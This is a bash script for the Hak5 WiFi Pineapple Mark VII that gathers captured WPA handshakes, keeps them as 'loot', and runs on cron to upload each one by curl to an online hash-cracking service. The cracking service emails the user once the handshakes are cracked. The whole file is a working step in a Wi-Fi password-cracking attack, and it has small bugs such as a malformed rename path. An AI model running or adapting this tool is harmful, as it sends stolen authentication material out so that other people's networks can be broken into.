#!/bin/bash
# sailboat-anon | fairwinds! | https://github.com/sailboat-anon/wifi-pineapple-mark-vii
# hak5 wifi pineapple mark vii | ohc-api.sh
# auto-submit captured WPA handshakes (.pcab) to onlinehashcrack.com, receive email upon completion | persistent handshake loot 
#
#                .  !  .
#                 . : . 
#        |\   -  -  O  -  -  
#       /| \      . : .
#      / |  \    .  !  .
#     / _|   \      :
#    /-' |===O=
#  _/____|__((___     ~ ~~ 
#  "\________bb_-' ~~ ~~ �~
# ~    ~     ~  ~~   ~  ~
#   ~     ~   ~   ~~ ~ ~  ~
#     ~
# chmod +x ohc-api.sh
# wifi pineAP v1.0.2 is very unstable and dumps /tmp/handshakes often | /tmp/handshakes is where your handshakes are stored, so when the device crashes you lose them
# keep yout loot, run this on cron:
# */5 * * * * /root/ohc-api.sh

# workflow:
# capture handshakes using mark vii
# handshakes are moved from /tmp to /root/loot/handshakes
# handshakes are sent to the onlinehashcrack.com api, user receives an email confirmation and upon completion
# (be sure to set the 'email' variable below to your email address)
# submitted handshakes in /root/loot/handshakes are renamed 'submitted-<formername>.cpab'
# 
# transaction logs: /root/loot/handshakes/logs
# persistent handshake loot: /root/loot/handshakes

email=sailb@home.local

echo "Submitting all current-state, unsubmitted handshakes in /tmp/handshakes to api.onlinehashcrack.com - Fairwinds!"
echo "See /root/loot/handshakes/logs for submission logs."
echo "----------------------------"
# setup our directories
if [ ! -d "/root/loot/handshakes" ]; then
  mkdir -p /root/loot/handshakes
fi
if [ ! -d "/root/loot/handshakes/logs" ]; then
  mkdir -p /root/loot/handshakes/logs
fi

# get all current-state, unsubmitted handshakes
echo "Checking for unsubmitted handshakes..."
if [ -d "/tmp/handshakes" ]; then
  ls /tmp/handshakes | grep -v "submitted*" > /tmp/ls-handshake.out
fi

if [ ! -s /tmp/ls-handshake.out ]
 then
	echo "Unsubmitted handshakes NOT FOUND, exiting gracefully..." 
    exit
fi

# we have found current-state, unsubmitted handshakes; let's submit them
echo "Unsubmitted handshakes FOUND, uploading to api.onlinehashcrack.com..."
cp -au /tmp/handshakes /root/loot
now=$(date +%s)
while IFS= read -r line; do curl -X POST -F "email=${email}" -F "file=@/root/loot/handshakes/${line}" https://api.onlinehashcrack.com; echo "Submitted ${line}!";done < /tmp/ls-handshake.out >> /root/loot/handshakes/logs/submitted-${now}.txt;

echo "Cleaning up..."
while IFS= read -r line; do mv "/tmp/handshakes/${line}" "/tmp/handshakes/submitted-${line}"; mv "/root/loot/handshakes/${line}" "/root/loot/handshakes/submitted-{$line}"; done < /tmp/ls-handshake.out;
rm /tmp/ls-handshake.out

echo "Output:"
cat /root/loot/handshakes/logs/submitted-${now}.txt
